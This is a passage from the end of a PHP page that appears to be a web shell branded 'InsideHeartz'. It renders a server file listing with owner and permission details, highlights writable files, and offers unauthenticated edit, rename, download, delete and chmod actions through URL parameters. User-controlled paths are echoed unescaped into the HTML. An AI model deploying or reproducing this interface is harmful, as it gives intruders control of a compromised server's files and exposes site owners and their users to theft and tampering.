        if (is_writable($path . '/' . $dir) || !is_readable($path . '/' . $dir)) {
            echo "</a>";
        }
        ?>
                            	</td>
								<td class="text-light"><?php 
        echo date("Y-m-d h:i:s", filemtime($dir));
        ?></td>
								<td>
									<?php 
        if ($dir != '.' && $dir != '..') {
            ?>
									<div class="btn-group">
                                        <a href="?dir=<?php 
            echo $path;
            ?>&item=<?php 
            echo $dir;
            ?>&action=rename" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Rename"><i class="fa fa-edit"></i></a>
										<a class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?php 
            echo $path;
            ?>&item=<?php 
            echo $dir;
            ?>&action=delete')" data-toggle="tooltip" data-placement="auto" title="Delete"><i class="fa fa-trash"></i></a>
									</div>
									<?php 
        } elseif ($dir === '.') {
            ?>
									<div class="btn-group">
										<a data-bs-toggle="collapse" href="#newFolderCollapse" role="button" aria-expanded="false" aria-controls="newFolderCollapse" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="New Folder"><i class="fa fa-folder-plus"></i></a>
										<a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="New File"><i class="fa fa-file-plus"></i></a>
									</div>
									<?php 
        }
        ?>
								</td>
							</tr>
							<?php 
    }
    ?>
							<?php 
    foreach ($dirs as $dir) {
        if (!is_file($dir)) {
            continue;
        }
        ?>
							<tr>
								<td>
									<a href="?dir=<?php 
        echo $path;
        ?>&item=<?php 
        echo $dir;
        ?>&action=edit" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?php 
        echo $dir;
        ?></a>
								</td>
								<td class="text-light"><?php 
        echo function_exists('mime_content_type') ? mime_content_type($dir) : filetype($dir);
        ?></td>
								<td class="text-light"><?php 
        echo fsize($dir);
        ?></td>
								<td class="text-light"><?php 
        echo getOwner($dir);
        ?></td>
								<td class="text-light">
	                           		<?php 
        echo '<a href="?dir=' . $path . '&item=' . $dir . '&action=chmod">';
        if (is_writable($path . '/' . $dir)) {
            echo "<font color=\"lime\">";
        } elseif (!is_readable($path . '/' . $dir)) {
            echo "<font color=\"red\">";
        }
        echo perms($path . '/' . $dir);
        if (is_writable($path . '/' . $dir) || !is_readable($path . '/' . $dir)) {
            echo "</a>";
        }
        ?>
                            	</td>
								<td class="text-light"><?php 
        echo date("Y-m-d h:i:s", filemtime($dir));
        ?></td>
								<td>
									<div class="btn-group">
										<a href="?dir=<?php 
        echo $path;
        ?>&item=<?php 
        echo $dir;
        ?>&action=edit" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Edit"><i class="fa fa-file-edit"></i></a>
                                        <a href="?dir=<?php 
        echo $path;
        ?>&item=<?php 
        echo $dir;
        ?>&action=rename" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Rename"><i class="fa fa-edit"></i></a>
										<a href="?dir=<?php 
        echo $path;
        ?>&item=<?php 
        echo $dir;
        ?>&action=download" class="btn btn-outline-light btn-sm mr-1" data-toggle="tooltip" data-placement="auto" title="Download"><i class="fa fa-file-download"></i></a>
										<a class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?php 
        echo $path;
        ?>&item=<?php 
        echo $dir;
        ?>&action=delete')" data-toggle="tooltip" data-placement="auto" title="Delete"><i class="fa fa-trash"></i></a>
									</div>
								</td>
							</tr>
							<?php 
    }
    ?>
						</tbody>
					</table>
				</div>
				<center>
					<hr width='50%'>Copyright &#169; InsideHeartz
				</center>
			</div>
		</div>
	</div>
	
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
  
	<script>
		
		<?php 
    if (isset($_SESSION['message'])) {
        ?>
		Swal.fire(
			'<?php 
        echo $_SESSION['status'];
        ?>',
			'<?php 
        echo $_SESSION['message'];
        ?>',
			'<?php 
        echo $_SESSION['class'];
        ?>'
		)
		<?php 
    }
    clear();
    ?>
		
		function deleteConfirm(url) {
			event.preventDefault()
			Swal.fire({
				title: 'Are you sure?',
				icon: 'warning',
				showCancelButton: true,
				confirmButtonColor: '#3085d6',
				cancelButtonColor: '#d33',
				confirmButtonText: 'Yes, delete it!'
				}).then((result) => {
				if (result.isConfirmed) {
					window.location.href = url
				}
			})
		}

		function jscopy() {
			var jsCopy = document.getElementById("CopyFromTextArea");
			jsCopy.focus();
			jsCopy.select();
			document.execCommand("copy");
		}

	</script>
 
</body>
</html>